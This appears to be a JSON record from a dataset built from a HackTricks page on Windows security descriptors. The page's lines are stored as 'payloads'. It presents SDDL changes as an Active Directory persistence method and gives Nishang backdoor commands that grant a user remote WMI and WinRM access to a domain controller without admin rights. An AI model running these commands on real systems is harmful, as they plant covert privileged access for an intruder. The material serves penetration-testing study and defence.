{
  "id": "windows_hardening_3c983a9e8d7f",
  "category": "windows-hardening",
  "title": "security descriptors",
  "description": "# Security Descriptors\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Security Descriptors\n\n[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`\n\nThe **security descriptors** are used to **store** the ",
  "payloads": [
    "# Security Descriptors",
    "{{#include ../../banners/hacktricks-training.md}}",
    "## Security Descriptors",
    "[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`",
    "The **security descriptors** are used to **store** the **permissions** an **object** has **over** an **object**. If you can just **make** a **little change** in the **security descriptor** of an object, you can obtain very interesting privileges over that object without needing to be member of a privileged group.",
    "Then, this persistence technique is based on the ability to win every privilege needed against certain objects, to be able to perform a task that usually requires admin privileges but without the need of being admin.",
    "### Access to WMI",
    "You can give a user access to **execute remotely WMI** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):",
    "```bash",
    "Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc \u2013namespace 'root\\cimv2' -Verbose",
    "Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc\u2013namespace 'root\\cimv2' -Remove -Verbose #Remove",
    "### Access to WinRM",
    "Give access to **winrm PS console to a user** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**",
    "```bash",
    "Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/windows-hardening/active-directory-methodology/security-descriptors.md"
  ]
}